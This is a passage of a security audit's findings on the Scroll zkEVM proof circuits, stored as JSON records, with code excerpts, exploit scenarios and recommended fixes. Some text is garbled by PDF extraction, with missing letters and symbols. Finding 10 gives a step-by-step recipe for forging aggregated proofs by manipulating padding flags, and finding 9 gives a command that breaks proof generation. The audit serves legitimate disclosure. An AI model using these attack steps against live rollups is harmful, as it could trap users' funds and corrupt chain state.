        "body": "The old_account_hash_traces and new_account_hash_traces arrays each contain triples of cells corresponding to input and output values of the Poseidon hash function. These arrays are populated by the account_hash_traces function, a portion of which is shown in gure 2.1. let mut account_hash_traces = [[Fr::zero(); 3]; 6]; account_hash_traces[0] = [codehash_hi, codehash_lo, h1]; account_hash_traces[1] = [storage_root, h1, h2]; account_hash_traces[2] = [nonce_and_codesize, balance, h3]; account_hash_traces[3] = [h3, h2, h4]; // account_hash_traces[4] = [h4, poseidon_codehash, account_hash]; account_hash_traces[5] = [ account_key, account_hash, domain_hash(account_key, account_hash, HashDomain::Leaf), ]; account_hash_traces Figure 2.1: src/types.rs#512523 This assignment does not match the specication in the mpt-proof.md specication, shown in gure 2.2. - `old_account_hash_traces`: Vector with item in `[[Fr; 3]; 6]`. For non-empty account - `[codehash_hi, codehash_lo, h1=hash(codehash_hi, codehash_lo)]` - `[h1, storage_root, h2=hash(h1, storage_root)]` - `[nonce, balance, h3=hash(nonce, balance)]` - `[h3, h2, h4=hash(h3, h2)]` - `[1, account_key, h5=hash(1, account_key)]` - `[h4, h5, h6=hash(h4, h5)]` Figure 2.2: spec/mpt-proof.md#131137 It appears that the version implemented in account_hash_traces matches the use in the rest of the circuit. For example, the snippet shown in gure 2.3 uses the expression old_account_hash_traces[1][0] to retrieve the value old_storage_root. ClaimKind::Storage { .. } | ClaimKind::IsEmpty(Some(_)) => self.old_account.map(|_| { let old_account_hash = old_account_hash_traces[5][1]; let old_h4 = old_account_hash_traces[4][0]; let old_h2 = old_account_hash_traces[1][2]; let old_storage_root = old_account_hash_traces[1][0]; vec![old_account_hash, old_h4, old_h2, old_storage_root] Figure 2.3: src/types.rs#642647 However, this pattern of referring to values in the account_hash_traces arrays by their indices is error-prone and dicult to check completely. Recommendations Short term, update the specication document to reect the current use of these arrays. Long term, replace ad hoc indexing with a struct that has named elds.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. hash_traces skips invalid leaf hashes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The hash_traces function takes a collection of Proof objects and returns an array of the Poseidon hash calls included in those objects, in a format suitable for lookups into the Poseidon table. For hashes in account leaf nodes, the correct domain is chosen by trial and error, as shown in gure 3.1. for account_leaf_hash_traces in [proof.old_account_hash_traces, proof.new_account_hash_traces] { for [left, right, digest] in account_leaf_hash_traces { if domain_hash(left, right, HashDomain::AccountFields) == digest { hash_traces.push(([left, right], HashDomain::AccountFields.into(), digest)) } else if domain_hash(left, right, HashDomain::Leaf) == digest { hash_traces.push(([left, right], HashDomain::Leaf.into(), digest)) } else if domain_hash(left, right, HashDomain::Pair) == digest { hash_traces.push(([left, right], HashDomain::Pair.into(), digest)) } } } } hash_traces Figure 3.1: mpt-circuit/src/gadgets/mpt_update.rs#20942108 If the hash does not match any domain, no entry is added to the returned list. This function is publicly exposed, and if it is used for certain purposes, such as generating the lookups in a circuit, it could lead to an underconstrained hash witness. hash_traces appears to be used only in a testing context, so it does not currently cause any security concerns. Recommendations Short term, add handling for all cases to hash_traces, and explicitly document when it should and should not be used. Long term, document all public functions and provide clear directions for when they should and should not be used.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. Values in chunk_is_valid_cells are not constrained to be Boolean ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The cells in the chunk_is_valid_cells vector indicate whether a chunk is real or padded. A padded chunk is simply a copy of the last real chunk. For each chunk, some checks are performed depending on whether it is valid. Currently, the chunk_is_valid_cells values are not constrained to be Boolean. When used in conditional equality checks, the lack of Boolean enforcement does not pose a problem because the constraint required for the conditional equality forces either the conditioning value to be 0 or the dierence of the values under comparison to be 0. However, chunk_is_valid_cells is also used to compute the number of valid cells in a batch. The num_valid_snarks function, shown in gure 4.1, takes the chunk_are_valid argument, which is called with the chunk_is_valid_cells value. fn num_valid_snarks( rlc_config: &RlcConfig, region: &mut Region<Fr>, chunk_are_valid: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, halo2_proofs::plonk::Error> { let mut res = chunk_are_valid[0].clone(); for e in chunk_are_valid.iter().skip(1) { res = rlc_config.add(region, &res, e, offset)?; } Ok(res) } Figure 4.1: aggregator/src/core.rs#935946 In practice, the impact of non-Boolean values in chunk_is_valid_cells is limited exclusively to the very rst chunk. Any non-Boolean chunk other than the rst one must satisfy two almost contradictory conditions. First, it must be continuous with the previous chunk; that is, its previous root must be equal to the previous chunks next root, as shown in gure 4.2: // 4 __valid__ chunks are continuous: they are linked via the state roots for i in 0..MAX_AGG_SNARKS - 1 { for j in 0..DIGEST_LEN {  rlc_config.conditional_enforce_equal( &mut region, &chunk_pi_hash_preimages[i + 1][PREV_STATE_ROOT_INDEX + j], &chunk_pi_hash_preimages[i][POST_STATE_ROOT_INDEX + j], &chunk_is_valid_cells[i + 1], &mut offset, )?; } } Figure 4.2: aggregator/src/core.rs#666690 Second, it must have equal public inputs to the previous chunk, as shown in gure 4.3: // 6. chunk[i]'s chunk_pi_hash_rlc_cells == chunk[i-1].chunk_pi_hash_rlc_cells when // chunk[i] is padded let chunks_are_padding = chunk_is_valid_cells .iter() .map(|chunk_is_valid| rlc_config.not(&mut region, chunk_is_valid, &mut offset)) .collect::<Result<Vec<_>, halo2_proofs::plonk::Error>>()?; let chunk_pi_hash_rlc_cells = parse_pi_hash_rlc_cells(data_rlc_cells); for i in 1..MAX_AGG_SNARKS { rlc_config.conditional_enforce_equal( &mut region, chunk_pi_hash_rlc_cells[i - 1], chunk_pi_hash_rlc_cells[i], &chunks_are_padding[i], &mut offset, )?; } Figure 4.3: aggregator/src/core.rs#692709 This requires the previous and next roots to be equal, which may be possible in non-zkEVM uses but which should not be possible in a zkEVM. However, these constraints do not prevent a non-Boolean value for chunk_is_valid_cells[0], so a malicious prover might hope to choose a value for it that enables an exploit. Suppose a batch of nine chunks is being aggregated; in that situation, the prover might hope to generate a proof with the initial and nal state roots of chunks[0..9] but with the batch hash of chunks[0..8], by setting the value of chunk_is_valid_cells[0] to -1. Several other checks must be passed to generate such a proof. First, the batch hash must be the hash corresponding to chunks[0..8]. In this case, the ags (flag1,flag2,flag3) are (0,1,0), so the chunk data hash will correspond to the second potential_batch_data_hash_digest value, as shown in gure 4.4: let rhs = rlc_config.mul( &mut region, &flag1, &potential_batch_data_hash_digest[(3 - i) * 8 + j], &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag2, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 32], &rhs, &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag3, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 64], &rhs, &mut offset, )?; region.constrain_equal( batch_pi_hash_preimage[i * 8 + j + CHUNK_DATA_HASH_INDEX].cell(), rhs.cell(), )?; Figure 4.4: aggregator/src/core.rs#602626 Second, the Keccak input length must equal 8, according to the constraints shown in gure 4.5: let data_hash_inputs_len = rlc_config.mul(&mut region, &num_valid_snarks, &const32, &mut offset)?;  let mut data_hash_inputs_len_rec = rlc_config.mul( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 3], &flag1, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 4], &flag2, &data_hash_inputs_len_rec, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 5], &flag3, &data_hash_inputs_len_rec, &mut offset, )?;  region.constrain_equal( data_hash_inputs_len.cell(), data_hash_inputs_len_rec.cell(), )?; Figure 4.5: aggregator/src/core.rs#744804 Third, the RLC of the Keccak data input must match any of the three possible Keccak RLC values. This constraint seems to prevent any practical use of a non-Boolean value for chunk_is_valid_cells[0] because the implementation of RlcConfig::select, shown in gure 4.6, returns the result of (1 - cond) * b + cond * a, which causes values in dierent positions of the RLC vector to be mixed together when cond equals -1. // if cond = 1 return a, else b pub(crate) fn select( &self, region: &mut Region<Fr>, a: &AssignedCell<Fr, Fr>, b: &AssignedCell<Fr, Fr>, cond: &AssignedCell<Fr, Fr>, offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { // (cond - 1) * b + cond * a let cond_not = self.not(region, cond, offset)?; let tmp = self.mul(region, a, cond, offset)?; self.mul_add(region, b, &cond_not, &tmp, offset) } Figure 4.6: This gure shows RlcConfig::select. Note that the comment incorrectly species (cond - 1) instead of (1 - cond), but either version causes the same mixing eect for non-Boolean ags. (aggregator/src/aggregation/rlc/gates.rs#296309) However, care should be taken when modifying the implementation of rlc_with_flag; if it treats all nonzero values of cond the same way, this attack may become possible. Recommendations Short term, add constraints to force the values in chunk_is_valid_cells to be Boolean. Long term, document all cases in which a constraint is enforced due to a combination of several constraints spread across the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "5. The Sig circuit may reject valid signatures ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The ecdsa_verify_no_pubkey_check function performs the steps required to verify an  ECDSA signature. The verication procedure requires checking that 1 are intermediary values generated during signature verication and is the public     1 , where and   2  2 key. The signature verication circuit performs these checks by enforcing that the  coordinate of are not equal, as shown in gure 5.1. and     1 2 TODO: Technically they could be equal for a valid signature, but this happens // check u1 * G and u2 * pubkey are not negatives and not equal // with // vanishing probability way // coordinates of u1_mul and u2_mul are in proper bigint form, and lie in but are not // constrained to [0, n) we therefore need hard inequality here let u1_u2_x_eq = base_chip.is_equal(ctx, &u1_mul.x, &u2_mul.x); let u1_u2_not_neg = base_chip.range.gate().not(ctx, Existing(u1_u2_x_eq)); for an ECDSA signature constructed in a standard Figure 5.1: zkevm-circuits/src/sig_circuit/ecdsa.rs#7480 As the comment in the code snippet in gure 5.1 indicates, checking the coordinate for  =   equality will also cause the circuit to be unsatisable on valid signatures where 1 2  .  A specially crafted secret key can be used to trigger this incompleteness vulnerability at will. This issue was also disclosed in a previous audit of the halo2-ecc library for Axiom and Scroll (TOB-AXIOM-4). Exploit Scenario Alice deploys a multisignature bridge contract from another EVM-like blockchain to the Scroll zkEVM. Bob, who is a signing party, wants to be able to maliciously stall the bridge at some future point. Bob generates a secret key in such a way that some specic, otherwise innocuous transaction will fail ecdsa_verify_no_pubkey_check when signed with Bobs key. At a later point, he submits this transaction, which is accepted on the non-Scroll side but which cannot be bridged into the Scroll zkEVM, leading to a denial of service and potentially a loss of funds. Recommendations Short term, modify the circuit to ensure that signatures with  =   1 2  are accepted but signatures with  =    1 2  are rejected. Long term, ensure that optimizations preserve correctness even in adversarial settings.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. assigned_y_tmp is not constrained to be 87 bits ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "Given a signature information in and recovers the ephemeral point Concretely, the circuit returns a value indicating whether the signature is valid and the value . , the ecdsa_verify_no_pubkey_check function uses the parity  corresponding to .  = (, ) (, , )   The Sig circuit then ensures that the recovered value is well formed by enforcing that  indeed captures the oddness of is the rst limb of the value that was satisfying the equation ,  + 2 =  0 previously recovered by ecdsa_verify_no_pubkey_check. Furthermore, 87-bit value to ensure soundness. The code snippet in gure 6.1 shows the last check, where . This is done by showing that there exists a value corresponds to the assigned_y_tmp variable. where    0    must be an // last step we want to constrain assigned_y_tmp is 87 bits ecc_chip .field_chip .range .range_check(ctx, &assigned_y_tmp, 88); Figure 6.1: zkevm-circuits/src/sig_circuit.rs#420424 Contrary to the comment in gure 6.1, the code constraints assigned_y_tmp to be 88 bits instead of 87 bits. However, this issue is unlikely to lead to any soundness issue because the extra bit aorded to malicious provers is not enough to craft an invalid witness that satises the constraints. Recommendations Short term, constrain assigned_y_tmp to be 87 bits. Long term, add negative tests to ensure that invariants are not violated.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "7. Aggregated proof verication algorithm is unspecied ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The zkEVM proof aggregation circuit architecture described in the aggregator/README.md le includes several instances of proof aggregation, in the form of both direct aggregation of proofs and nested aggregation (i.e., aggregation of already-aggregated proofs). Based on our understanding of the architecture and the implementation, the nal aggregate proof will consist of a triple (_, , ) : 1. _ is the hash of the overall public inputs of the aggregated proofs. 2. 3. is the aggregated all-but-the-pairing proof, which, when veried with a pairing  check, should guarantee that each input proof and all aggregation proofs except the very last one all pass verication. is a SHPLONK proof that  therefore, checking _ are correctly constructed and that, with a pairing in fact veries the overall tree of proofs. and   However, the actual details of how to construct and verify this triple are not clearly specied, documented, or implemented. There are testing-focused macros in the aggregator/src/tests.rs le that implement proof generation followed immediately by verication; the dierent components of the proof are represented by the macros layer_0, compression_layer_snark, compression_layer_evm, and aggregation_layer_snark. However, there are no distinct implementations of procedures for the following:  Proving and verifying key generation  Proof generation using the proving key and a witness  Verication using the verication key and a proof Implementing each of these procedures distinctly, especially the key generation and verication procedures, is critical for evaluating the soundness of the aggregate proof system. Even if there are not specic problems in the aggregation or compression circuits, there may be catastrophic issues if vital checks are unintentionally skipped; for example, for key generation to be correct, the verication keys of inner circuits must be constants in the outer circuits, and in the verication algorithm, both the aggregated proof and the outermost aggregation proof must be checked. Recommendations Short term, develop, implement, and review a clear specication of the proof aggregation circuit. Long term, explicitly document the intended security properties of the zkEVM aggregated proof, and connect those properties to the specication with security proofs or proof sketches. For example, a rough sketch for the compression circuit may look like the following: Intended security property: Verifying the compression circuit applied to circuit  should prove knowledge of a valid all-but-the-pairing SHPLONK proof for specically for ,   (and ), which has specic public inputs, potentially has an accumulator and has several polynomial opening proofs, all of which are aggregated   together into an overall accumulator  pairing check on . satises the circuit  . After verifying the compression circuit, a should prove that there exists a witness assignment  that is guaranteed because the compression  Proof sketch: Knowledge of the proof for circuit includes a SHPLONK all-but-the-pairing verier, and the verication key for  is a constant in the compression circuit, which is written into the transcript during in-circuit verication. Correct accumulation is guaranteed because the compression circuit includes an accumulation verier for polynomial commitment multi-opening proofs, which checks that the public input Thus, verifying the compression circuit and performing a pairing check on  proves that there exists a witness assignment is a correctly accumulated proof.  that satises .  ",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "8. Aggregation prover veries each aggregated proof ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The zkEVM proof aggregation algorithms combine several all-but-the-pairing proofs into a single all-but-the-pairing proof which, when veried with a pairing, simultaneously veries all the constituent proofs. As sanity check measures, the functions extract_accumulators_and_proof, AggregationCircuit::new, and CompressionCircuit::new perform a pairing check on each aggregated input proof and on the outer aggregated proof, as shown in gures 8.1, 8.2, and 8.3. for (i, acc) in accumulators.iter().enumerate() { let KzgAccumulator { lhs, rhs } = acc; let left = Bn256::pairing(lhs, g2); let right = Bn256::pairing(rhs, s_g2); log::trace!(\"acc extraction {}-th acc check: left {:?}\", i, left); log::trace!(\"acc extraction {}-th acc check: right {:?}\", i, right); if left != right { return Err(snark_verifier::Error::AssertionFailure(format!( \"accumulator check failed {left:?} {right:?}, index {i}\", ))); } //assert_eq!(left, right, \"accumulator check failed\"); } Figure 8.1: Pairing calls in extract_accumulators_and_proof (aggregator/src/core.rs#7587) let left = Bn256::pairing(&lhs, &params.g2()); let right = Bn256::pairing(&rhs, &params.s_g2()); log::trace!(\"aggregation circuit acc check: left {:?}\", left); log::trace!(\"aggregation circuit acc check: right {:?}\", right); if left != right { return Err(snark_verifier::Error::AssertionFailure(format!( \"accumulator check failed {left:?} {right:?}\", ))); } Figure 8.2: Pairing calls in AggregationCircuit::new (aggregator/src/aggregation/circuit.rs#110118) let left = Bn256::pairing(&lhs, &params.g2()); let right = Bn256::pairing(&rhs, &params.s_g2()); log::trace!(\"compression circuit acc check: left {:?}\", left); log::trace!(\"compression circuit acc check: right {:?}\", right); if left != right { return Err(snark_verifier::Error::AssertionFailure(format!( \"accumulator check failed {left:?} {right:?}\", ))); } Figure 8.3: Pairing calls in CompressionCircuit::new (aggregator/src/compression/circuit.rs#205214) These checks prevent developers from writing negative tests; for example, they would block a test that aggregates an incorrect proof with many correct proofs and then checks that the result does not pass verication. In addition, pairing calls tend to be expensive to compute, so these calls may unnecessarily decrease prover performance. Recommendations Short term, make these checks conditional, either with a feature ag or a function parameter; then, write negative tests for aggregation and compression. Long term, ensure that security-critical features such as aggregation verication can be tested both positively and negatively.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "9. KECCAK_ROWS environment variable may disagree with DEFAULT_KECCAK_ROWS constant ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The number of rows per round of the Keccak-f box in the Keccak table is represented by the DEFAULT_KECCAK_ROWS constant in the aggregator crate and is used via the calculated ROWS_PER_ROUND constant to extract data from the Keccak table, as shown in gure 9.1: if offset % ROWS_PER_ROUND == 0 && offset / ROWS_PER_ROUND <= MAX_KECCAK_ROUNDS { // first column is is_final is_final_cells.push(row[0].clone()); // second column is data rlc data_rlc_cells.push(row[1].clone()); // third column is hash len hash_input_len_cells.push(row[2].clone()); } Figure 9.1: aggregator/src/core.rs#253261 However, the ROWS_PER_ROUND constant is not guaranteed to match the parameters of the Keccak circuit, and in fact, the rows-per-round parameter of the Keccak circuit is read from the KECCAK_ROWS environment variable multiple times while the circuit is being constructed, as shown in gures 9.2 and 9.3. pub(crate) fn get_num_rows_per_round() -> usize { var(\"KECCAK_ROWS\") .unwrap_or_else(|_| format!(\"{DEFAULT_KECCAK_ROWS}\")) .parse() .expect(\"Cannot parse KECCAK_ROWS env var as usize\") } Figure 9.2: zkevm-circuits/src/keccak_circuit/keccak_packed_multi.rs#15 for p in 0..3 { column_starts[p] = cell_manager.start_region(); let mut row_idx = 0; for j in 0..5 { for _ in 0..num_word_parts { for i in 0..5 { rho_pi_chi_cells[p][i][j] .push(cell_manager.query_cell_value_at_row(row_idx as i32)); } row_idx = (row_idx + 1) % get_num_rows_per_round(); } } } Figure 9.3: A loop that repeatedly reads the KECCAK_ROWS environment variable (zkevm-circuits/src/keccak_circuit/keccak_packed_multi.rs#677689) If this environment variable is incorrect when the verication key is generated, or if it changes during the layout phase, a potentially incorrect circuit may be generated. However, this type of change would aect many parts of the code, including the witness generation implementation, and is unlikely to pass even basic tests. Because of that, we do not consider this to be a plausible soundness problem. However, a prover whose environment sets KECCAK_ROWS to an incorrect value would consistently fail to create proofs, causing a potential denial-of-service attack vector. For example, running the command KECCAK_ROWS=20 cargo test release test_aggregation_circuit in the aggregator/ folder fails on the assertion shown in gure 9.4: assert_eq!( columns.len(), 87, \"cell manager configuration does not match the hard coded setup\" ); Figure 9.4: aggregator/src/aggregation/config.rs#9094 We did not explore other options for KECCAK_ROWS or more sophisticated attack scenarios such as changing the KECCAK_ROWS environment variable during prover execution. Exploit Scenario Alice runs a sequencer for the Scroll zkEVM. Bob convinces her to install an MEV optimizer, which under normal conditions behaves normally. However, the optimizer software sets KECCAK_ROWS to other values whenever Bob wishes, causing Alice to consistently fail to generate proofs, causing a denial of service. Recommendations Short term, change get_num_rows_per_round so that it reads KECCAK_ROWS only once (e.g., with lazy_static), and add assertions to the aggregator codebase to make sure that KECCAK_ROWS equals DEFAULT_KECCAK_ROWS. Long term, document all conguration parameters for the zkEVM circuits and any required relationships between them.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Incorrect state transitions can be proven for any chunk by manipulating padding ags ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "Due to insucient constraints in the aggregation circuits padding logic, a malicious prover can generate two types of invalid proofs: 1. For any chunk A, a malicious prover can prove that the empty batch steps from A.prev_root to A.next_root. 2. For any pair of chunks (A,B) that is continuous (i.e., A.next_root equals B.prev_root), and any choice of data hash evil_data_hash, a malicious prover can generate an aggregated proof in which batch_prev_root equals A.prev_root, batch_next_root equals B.next_root, and batch_data_hash equals keccak(evil_data_hash). Attack 1 is problematic but unlikely to occur in practice unless empty batches or sub-batches are allowed to cause state updates. Attack 2 is extremely severe because it allows a malicious prover to prove that any data_hash has almost any state transition. Due to time constraints, we were not able to develop proof-of-concept exploits demonstrating these two attacks, but we believe that such exploits are possible. The aggregation circuit takes a sequence of SNARKs ,...,   1  is intended to be a Boolean value indicating whether and a sequence of validity   is a ags ,...,   , where each  1   proof for a valid chunk or a padding chunk. Each must be a correct SNARK, but dierent   rules are enforced on the public inputs of valid and padding chunks. Valid chunks after the rst one must be continuous with the previous chunk, while padding chunks after the rst one must have exactly equal public inputs to the previous chunk. These checks are shown in gures 10.1 and 10.2. // 4 __valid__ chunks are continuous: they are linked via the state roots for i in 0..MAX_AGG_SNARKS - 1 { for j in 0..DIGEST_LEN {  rlc_config.conditional_enforce_equal( &mut region, &chunk_pi_hash_preimages[i + 1][PREV_STATE_ROOT_INDEX + j], &chunk_pi_hash_preimages[i][POST_STATE_ROOT_INDEX + j], &chunk_is_valid_cells[i + 1], &mut offset, )?; } } Figure 10.1: aggregator/src/core.rs#666690 // 6. chunk[i]'s chunk_pi_hash_rlc_cells == chunk[i-1].chunk_pi_hash_rlc_cells when // chunk[i] is padded let chunks_are_padding = chunk_is_valid_cells .iter() .map(|chunk_is_valid| rlc_config.not(&mut region, chunk_is_valid, &mut offset)) .collect::<Result<Vec<_>, halo2_proofs::plonk::Error>>()?; let chunk_pi_hash_rlc_cells = parse_pi_hash_rlc_cells(data_rlc_cells); for i in 1..MAX_AGG_SNARKS { rlc_config.conditional_enforce_equal( &mut region, chunk_pi_hash_rlc_cells[i - 1], chunk_pi_hash_rlc_cells[i], &chunks_are_padding[i], &mut offset, )?; } Figure 10.2: aggregator/src/core.rs#692709  The README section shown in gure 10.3 suggests that, for some situations in which    the rst not explicitly enforced by the aggregation circuit, and both attacks rely on manipulation of the validity ags. chunks will be padding; however, this is chunks will be valid and the last  > 1 , 4. chunks are continuous when they are not padded: they are linked via the state roots. ``` for i in 1 ... k-1 c_i.post_state_root == c_{i+1}.prev_state_root ``` 5. All the chunks use a same chain id. __Static__. ``` for i in 1 ... n batch.chain_id == chunk[i].chain_id ``` 6. The last `(n-k)` chunk[i] are padding ``` for i in 1 ... n: if is_padding: chunk[i]'s chunk_pi_hash_rlc_cells == chunk[i-1].chunk_pi_hash_rlc_cells ``` Figure 10.3: aggregator/README.md#102120 Attack 1 involves setting all   ags to 0 and setting all chunks to A. When that occurs, all batch public input elds other than chain_id and batch_data_hash will be calculated from A, as shown in gure 10.4. for i in 0..DIGEST_LEN { // 2.1 chunk[0].prev_state_root    } region.constrain_equal( batch_pi_hash_preimage[i + PREV_STATE_ROOT_INDEX].cell(), chunk_pi_hash_preimages[0][i + PREV_STATE_ROOT_INDEX].cell(), )?; // 2.2 chunk[k-1].post_state_root region.constrain_equal( batch_pi_hash_preimage[i + POST_STATE_ROOT_INDEX].cell(), chunk_pi_hash_preimages[MAX_AGG_SNARKS - 1][i + POST_STATE_ROOT_INDEX] .cell(), )?; // 2.3 chunk[k-1].withdraw_root region.constrain_equal( batch_pi_hash_preimage[i + WITHDRAW_ROOT_INDEX].cell(), chunk_pi_hash_preimages[MAX_AGG_SNARKS - 1][i + WITHDRAW_ROOT_INDEX].cell(), )?; Figure 10.4: aggregator/src/core.rs#355406 The cells in potential_batch_data_hash_preimage will not be constrained to be equal to any of the chunk data_hash elds, as shown in gure 10.5. for i in 0..MAX_AGG_SNARKS { for j in 0..DIGEST_LEN {  rlc_config.conditional_enforce_equal( &mut region, &chunk_pi_hash_preimages[i][j + CHUNK_DATA_HASH_INDEX], &potential_batch_data_hash_preimage[i * DIGEST_LEN + j], &chunk_is_valid_cells[i], &mut offset, )?; } } Figure 10.5: aggregator/src/core.rs#642664 num_valid_snarks will equal 0, and the hash-selection ags will be (1,0,0), as shown in gure 10.6. let flag1 = rlc_config.is_smaller_than( &mut region, &num_valid_snarks, &five, &mut offset, )?; let not_flag1 = rlc_config.not(&mut region, &flag1, &mut offset)?; let not_flag3 = rlc_config.is_smaller_than( &mut region, &num_valid_snarks, &nine, &mut offset, )?; let flag3 = rlc_config.not(&mut region, &not_flag3, &mut offset)?; let flag2 = rlc_config.mul(&mut region, &not_flag1, &not_flag3, &mut offset)?; Figure 10.6: aggregator/src/core.rs#524538 The calculated input length will be 0, and the length eld of the rst row of the batch_data_hash section will be 0, as shown in gure 10.7. let data_hash_inputs_len = rlc_config.mul(&mut region, &num_valid_snarks, &const32, &mut offset)?;  let mut data_hash_inputs_len_rec = rlc_config.mul( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 3], &flag1, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 4], &flag2, &data_hash_inputs_len_rec, &mut offset, )?; data_hash_inputs_len_rec = rlc_config.mul_add( &mut region, &hash_input_len_cells[MAX_AGG_SNARKS * 2 + 5], &flag3, &data_hash_inputs_len_rec, &mut offset, )?;  region.constrain_equal( data_hash_inputs_len.cell(), data_hash_inputs_len_rec.cell(), )?; Figure 10.7: aggregator/src/core.rs#744804 Based on the ags and the calculated input length, the batch data hash will be the Keccak hash of an empty sequence, as determined by the constraints in gure 10.8. let rhs = rlc_config.mul( &mut region, &flag1, &potential_batch_data_hash_digest[(3 - i) * 8 + j], &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag2, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 32], &rhs, &mut offset, )?; let rhs = rlc_config.mul_add( &mut region, &flag3, &potential_batch_data_hash_digest[(3 - i) * 8 + j + 64], &rhs, &mut offset, )?; region.constrain_equal( batch_pi_hash_preimage[i * 8 + j + CHUNK_DATA_HASH_INDEX].cell(), rhs.cell(), )?; Figure 10.8: aggregator/src/core.rs#602626 The last constraint that must be satised for attack 1 to succeed is the RLC calculation, shown in gure 10.9. In theory, the RLC should be equal to 0, so the check should succeed by equaling the RLC of the rst row. However, due to nding TOB-SCROLL3-11, the calculated RLC will equal the rst byte of the batch_data_hash section, which is a padding byte equal to 1. This can be resolved by setting the second row of the batch_data_hash section, which is otherwise unused in this situation, to the one-byte sequence [1]. let rlc_cell = rlc_config.rlc_with_flag( &mut region, potential_batch_data_hash_preimage[..DIGEST_LEN * MAX_AGG_SNARKS].as_ref(), &challenge_cell, &flags, &mut offset, )?;  // assertion let t1 = rlc_config.sub( &mut region, &rlc_cell, &data_rlc_cells[MAX_AGG_SNARKS * 2 + 3], &mut offset, )?; let t2 = rlc_config.sub( &mut region, &rlc_cell, &data_rlc_cells[MAX_AGG_SNARKS * 2 + 4], &mut offset, )?; let t3 = rlc_config.sub( &mut region, &rlc_cell, &data_rlc_cells[MAX_AGG_SNARKS * 2 + 5], &mut offset, )?; let t1t2 = rlc_config.mul(&mut region, &t1, &t2, &mut offset)?; let t1t2t3 = rlc_config.mul(&mut region, &t1t2, &t3, &mut offset)?; rlc_config.enforce_zero(&mut region, &t1t2t3)?; Figure 10.9: aggregator/src/core.rs#817866 Attack 2 must pass many of the same constraints, and proceeds as follows: 1. Set the batch to [A,A,A,A,B,B,...,B] and the validity ags to [0,0,0,0,1,0,0,...,0] (i.e., the rst four chunks are padding chunks containing A, the fth chunk is a valid chunk containing B, and the remaining chunks are padding chunks containing B). 2. Set the rst row of the batch_data_hash section to evil_data_hash[0..32]. This will satisfy the constraints shown in gures 10.7 and 10.8 and will cause the batch data hash to equal keccak(evil_data_hash), the result from this row. 3. Set the second row of the batch_data_hash section to B.data_hash[0..32] to satisfy the requirements shown in gure 10.5. Set the final ag on this row to avoid interfering with the next step. 4. Set the third row of the batch_data_hash to [A.data_hash[0],B.data_hash[0],B.data_hash[1],...,B.data_hash[31]] so that the data_rlc value in this row will satisfy the constraints in gure 10.9 by matching the incorrect calculation of rlc_cell due to nding TOB-SCROLL3-11. We believe that this attack can generalize further, but due to time constraints, we did not evaluate any other cases. If nding TOB-SCROLL3-11 is resolved, the attack is still possible: steps 3 and 4 must be modied so that the third row is all zeros and the final ag is not set in the second row. Exploit Scenario Alice sends a deposit to the Scroll zkEVM L2 contract, and the L1 message for that deposit is included in a chunk that is successfully committed but not yet nalized. Bob uses attack 2 to generate a proof for an incorrect state transition and uses that proof to nalize the chunk that Alice sent. The L1 messages that would be popped by that chunk are removed from the queue with no eect, and because the chunk has been nalized, it cannot be reverted, causing Alices funds to be trapped in the Scroll L2 contract with no way of withdrawing them. Recommendations Short term, add constraints so that num_valid_snarks must be nonzero and chunk_is_valid_cells must not have any valid cells after padding chunks. Long term, specify, review, and test all security-critical logic such as the aggregation padding validation as thoroughly as possible. In particular, scrutinize any constraints that have unusual implementation patterns or could lead to any unconstrained or underconstrained cells. Although the most important x involves constraining chunk_is_valid_cells directly, attack 2 of this nding is only as severe as it is because some otherwise innocuous constraints were more exible than they strictly needed to be:  If potential_batch_data_hash_preimage cells (shown in gure 10.5) were always constrained, even for padding chunks, it would not have been possible to ll the rst row with the data from evil_data_hash.  If unused 